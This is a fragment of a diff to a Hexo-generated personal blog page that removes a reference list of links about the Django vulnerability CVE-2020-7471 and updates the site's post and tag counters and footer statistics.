-<li><a target="_blank" rel="noopener" href="https://github.com/Saferman/CVE-2020-7471">https://github.com/Saferman/CVE-2020-7471</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/255947.html">https://www.freebuf.com/vuls/255947.html</a></li>
-<li><a target="_blank" rel="noopener" href="https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/">https://ryu22e.org/en/posts/2020/02/06/django-cve-2020-7471/</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2070,7 +2226,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-count">16</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -2079,7 +2235,7 @@
         <span class="site-state-item-name">分类</span>
       </div>
       <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-count">42</span>
         <span class="site-state-item-name">标签</span>
       </div>
   </nav>
@@ -2111,6 +2267,16 @@
     <i class="fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">swanQ</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">NaNm</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">NaN:aN</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
